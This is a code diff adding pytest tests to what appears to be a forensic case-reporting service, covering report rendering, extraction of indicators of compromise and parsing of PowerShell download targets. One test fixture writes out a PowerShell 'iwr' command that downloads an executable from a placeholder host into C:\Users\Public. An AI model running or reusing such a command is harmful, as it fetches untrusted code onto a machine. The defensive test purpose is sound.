@@ -203,3 +203,61 @@ def test_detection_without_stored_event_time_uses_the_matched_event_time(monkeyp
 
     monkeypatch.setattr(report_service, "search_documents", failing_search)
     assert report_service._resolve_detection_event_times("case-1", [detection]) == {}
+
+
+def test_analyst_narrative_is_not_clipped(monkeypatch: pytest.MonkeyPatch) -> None:
+    _quiet_sources(monkeypatch)
+    long_summary = ("The attacker moved from WS01 to the domain controller. " * 40).strip() + " END-OF-SUMMARY"
+    notes = {**report_service.DEFAULT_ANALYST_NOTES, "executive_summary": long_summary}
+    db = _FakeDb(case=Case(id="case-1", name="Sample", status="open", timezone="UTC"), reports=[_report(analyst_notes=notes)])
+
+    preview = report_service.build_case_report_preview(db, "case-1", "report-1")
+
+    assert len(long_summary) > 1200
+    assert "END-OF-SUMMARY" in preview["sections"][0]["markdown"]
+
+
+def test_hosts_table_counts_the_reported_findings() -> None:
+    finding = _finding("finding-1", title="Lateral movement", severity=FindingSeverity.high, status=FindingStatus.confirmed, hosts=["WS01", "ws02.corp.local"])
+    context = {"hosts": [{"host": "WS01", "events_count": 10}, {"host": "WS02", "events_count": 5}, {"host": "DC01", "events_count": 1}]}
+
+    markdown = report_service._render_hosts(context, [finding])
+
+    assert "| WS01 | 10 | 1 | 1 |" in markdown
+    assert "| DC01 | 1 | 0 | 0 |" in markdown
+
+
+def test_iocs_leave_out_system_binaries_hosts_and_command_lines() -> None:
+    rows: list[tuple] = []
+
+    def remember(ioc_type, value, **_kwargs):
+        rows.append((ioc_type, value))
+
+    report_service._extract_iocs_from_event(
+        {
+            "process": {"name": "svchost.exe", "executable": r"C:\Windows\System32\svchost.exe", "command_line": "svchost.exe -k netsvcs"},
+            "file": {"path": r"C:\Users\Public\psexec.exe", "sha256": "b" * 64},
+        },
+        remember,
+        "bookmark:x",
+        None,
+    )
+    report_service._extract_iocs_from_event({"process": {"executable": r"C:\Users\bob\Downloads\tool.exe"}}, remember, "bookmark:y", None)
+
+    assert ("file", r"C:\Users\Public\psexec.exe") in rows and ("hash", "b" * 64) in rows
+    assert ("file", r"C:\Users\bob\Downloads\tool.exe") in rows
+    assert not any(kind == "process" or "svchost" in str(value) for kind, value in rows)
+
+
+def test_powershell_script_arguments_are_not_a_download_target() -> None:
+    from app.ingest.powershell.helpers import extract_primary_download_target
+
+    script = r".\baklavasom.ps1 -e \\SRV01\files -s 203.0.113.9 -p 8800 -x"
+    assert extract_primary_download_target(script, None) is None
+    assert extract_primary_download_target(r"iwr -uri https://x.test/a.exe -OutFile C:\Users\Public\a.exe", None) == r"C:\Users\Public\a.exe"
+
+
+def test_download_target_without_url_is_not_an_ioc() -> None:
+    rows: list[tuple] = []
+    report_service._extract_iocs_from_event({"download": {"url": None, "target_path": r"\\SRV01\files -s 1.2.3.4"}}, lambda t, v, **_k: rows.append((t, v)), "x", None)
+    assert rows == []
